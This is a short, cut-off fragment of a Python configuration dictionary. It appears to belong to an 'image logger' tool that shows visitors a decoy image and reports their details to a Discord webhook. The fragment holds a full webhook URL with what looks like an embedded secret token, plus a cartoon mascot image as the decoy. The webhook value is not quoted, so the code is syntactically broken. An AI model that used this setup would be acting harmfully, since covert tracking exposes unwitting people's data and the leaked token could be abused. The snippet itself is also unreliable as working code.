...
config = {
    # BASE CONFIG #
    "webhook": https://discord.com/api/webhooks/1390492171613765764/7zb7KhfXj1UzJsYhSLExphiA0UbIL1JlLHHOuehmKZ8RIQ2LCWtm-Mw1TAdac_gbGfVM,
    "image": "https://upload.wikimedia.org/wikipedia/en/2/28/Bubsy_Mascot.png", # You can also have a custom image by using a URL argument
